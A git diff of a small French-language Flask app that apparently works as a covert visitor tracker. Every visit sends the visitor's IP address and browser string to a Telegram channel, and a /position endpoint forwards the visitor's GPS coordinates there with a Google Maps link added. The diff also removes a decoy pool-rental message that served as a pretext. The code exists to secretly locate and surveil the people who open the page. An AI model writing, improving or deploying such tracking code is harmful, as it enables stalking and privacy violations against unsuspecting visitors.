@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, jsonify
 import datetime
 import requests
 
@@ -25,28 +25,28 @@ def accueil():
     navigateur = request.user_agent.string
     date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    message = (
-        f"📥 Nouvelle visite détectée :\n"
-        f"🕒 Date : {date}\n"
-        f"🌍 IP : {ip}\n"
-        f"🖥 Navigateur : {navigateur}\n\n"
-        f"📩 Message envoyé :\n"
-        f\"\"\"Bonjour, nous sommes intéressés par la location de la piscine. 
-Nous sommes 10 personnes et souhaitons réserver pour le samedi 5 juillet à Marseille.
-Pouvez-vous nous transmettre les informations nécessaires ? Merci. Cordialement, Mme Khanous.\"\"\"
-    )
+    message = f"📥 Nouvelle visite détectée :\n" \
+              f"🕒 Date : {date}\n" \
+              f"🌍 IP : {ip}\n" \
+              f"🖥 Navigateur : {navigateur}"
+
     envoyer_telegram(message)
     return render_template("page.html")
 
-@app.route("/log_position", methods=["POST"])
-def log_position():
+@app.route("/position", methods=["POST"])
+def position():
     data = request.get_json()
     latitude = data.get("latitude")
     longitude = data.get("longitude")
+
     if latitude and longitude:
-        message = f"📍 Position GPS :\nLatitude : {latitude}\nLongitude : {longitude}"
+        message = f"📍 Position approximative reçue :\n" \
+                  f"Latitude : {latitude}\n" \
+                  f"Longitude : {longitude}\n" \
+                  f"https://www.google.com/maps?q={latitude},{longitude}"
         envoyer_telegram(message)
-    return "", 204
+
+    return jsonify({"status": "ok"})
 
 if __name__ == "__main__":
     app.run(debug=True)
